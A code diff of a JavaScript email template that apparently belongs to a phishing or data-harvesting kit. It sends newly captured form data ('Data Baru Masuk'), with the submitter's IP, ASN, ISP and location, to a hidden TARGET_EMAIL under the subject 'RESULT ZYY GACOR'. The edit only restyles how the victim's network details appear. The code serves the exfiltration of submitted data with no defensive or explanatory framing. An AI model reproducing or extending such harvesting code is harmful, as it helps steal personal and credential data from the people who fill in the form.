@@ -90,7 +90,7 @@ try {
       body: JSON.stringify({
   from: "onboarding@resend.dev",
   to: TARGET_EMAIL,
-  subject: "👑RESULT ZYY GACOR♨️",
+  subject: "👑RESULT ZYY GACOR",
   html: `
     <div style="font-family:sans-serif;max-width:480px;margin:0 auto;padding:24px;background:#f4f5f8;border-radius:12px;">
       <h2 style="color:#1b1e25;margin:0 0 16px;">Data Baru Masuk</h2>
@@ -104,23 +104,8 @@ try {
           <td style="padding:12px 16px;color:#1b1e25;font-weight:600;">${belakang}</td>
         </tr>
         <tr>
-          <td colspan="2" style="padding:12px 16px;background:#f4f5f8;font-weight:600;color:#1b1e25;">Informasi Jaringan</td>
-        </tr>
-        <tr>
-          <td style="padding:12px 16px;color:#7a8296;">IP Address</td>
-          <td style="padding:12px 16px;color:#1b1e25;">${ip}</td>
-        </tr>
-        <tr>
-          <td style="padding:12px 16px;color:#7a8296;">ASN</td>
-          <td style="padding:12px 16px;color:#1b1e25;">${asn}</td>
-        </tr>
-        <tr>
-          <td style="padding:12px 16px;color:#7a8296;">ISP</td>
-          <td style="padding:12px 16px;color:#1b1e25;">${isp}</td>
-        </tr>
-        <tr>
-          <td style="padding:12px 16px;color:#7a8296;">Lokasi</td>
-          <td style="padding:12px 16px;color:#1b1e25;">${lokasi}</td>
+          <td style="padding:12px 16px;color:#7a8296;font-size:13px;">Info jaringan</td>
+          <td style="padding:12px 16px;color:#1b1e25;font-size:13px;">${ipInfoHtml}</td>
         </tr>
       </table>
       <p style="color:#7a8296;font-size:12px;margin-top:16px;">Dikirim otomatis dari form ladang</p>
